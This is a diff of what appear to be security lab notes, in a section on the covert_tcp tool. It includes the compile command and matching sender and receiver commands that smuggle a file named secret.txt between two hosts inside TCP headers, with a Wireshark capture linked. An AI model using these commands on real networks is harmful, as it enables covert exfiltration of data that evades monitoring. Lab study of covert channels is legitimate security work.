@@ -390,6 +390,7 @@ sdcard/Download/secret.txt
 <summary>Covert</summary>
   
 > Covert_tcp [source code](covert_tcp.c)
+
 > [Wireshark Capture](Covert_TCP-Capture.pcapng) Hello  This 123 -
 
 ```shell
@@ -398,13 +399,11 @@ cc -o covert_tcp covert_tcp.c
   
 # Reciever Machine(192.168.29.53)  
 sudo ./covert_tcp -dest 192.168.29.53 -source 192.168.29.123 -source_port 9999 -dest_port 8888 -server -file recieve.txt  
-
-  
+ 
 # Sender Machine(192.168.29.123) 
 # Create A Message file that need to be transferred Eg:secret.txt
 sudo ./covert_tcp -dest 192.168.29.53 -source 192.168.29.123 -source_port 8888 -dest_port 9999 -file secret.txt
 
 ```
-  
-  
+<img src="covertCapture.jpg" />  
 </details>
